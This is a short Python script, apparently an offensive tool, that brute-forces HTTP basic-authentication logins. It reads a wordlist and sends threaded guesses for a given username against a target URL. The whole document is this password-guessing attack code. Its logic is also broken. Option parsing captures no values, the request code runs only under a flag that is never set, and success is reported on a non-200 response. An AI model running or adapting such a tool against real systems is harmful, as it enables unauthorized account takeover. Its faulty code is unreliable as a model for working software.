import requests
import sys
from threading import Thread
import getopt

global hit
global i
hit = False
i = [0]


def banner():
    print("#########################")
    print("*   Basic Bruteforcer   *")
    print("#########################")


def start(argv):
    banner()
    try:
        opts, args = getopt.getopt(argv, "uwft")
    except getopt.GetoptError:
        print("Invalid arguments")
    except Exception as e:
        print(e)

    for opt, arg in opts:
        if opt == "-u":
            user = arg
        elif opt == "-w":
            url = arg
        elif opt == "-f":
            file = arg
        elif opt == "-t":
            threads = arg

    try:
        f = open(file, "r")
        passwords = f.readlines()
    except Exception as e:
        print(e)

    launcher_thread(url, passwords, user)


def launcher_thread(url: str, passwords_list: list, username: str, n_thread: int = 1):
    while len(passwords_list):
        if hit is False:
            try:
                if i[0] < n_thread:
                    passwd = passwords_list.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(passwd=passwd, user=username, url=url)
                    thread.start()
            except KeyboardInterrupt:
                print("Interrupted by the user")
                sys.exit()
            thread.join()


class request_performer(Thread):
    def __init__(self, passwd: str, user: str, url: str):
        Thread.__init__(self)
        self.password = passwd.split("\n")[0]
        self.username = user
        self.url = url
        print("-" + self.password + "-")

    def run(self):
        if hit == True:
            try:
                req = requests.get(url=self.url, auth=(self.username, self.password))
                if req.status_code != 200:
                    print("Password found: " + self.password)
                    sys.exit(1)
                else:
                    print("Invalid credentials: " + self.password)
                    i[0] = i[0] -1
            except Exception as e:
                print(e)


if __name__ == '__main__':
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("Interrupted by the user")
    except Exception as e:
        print(e)
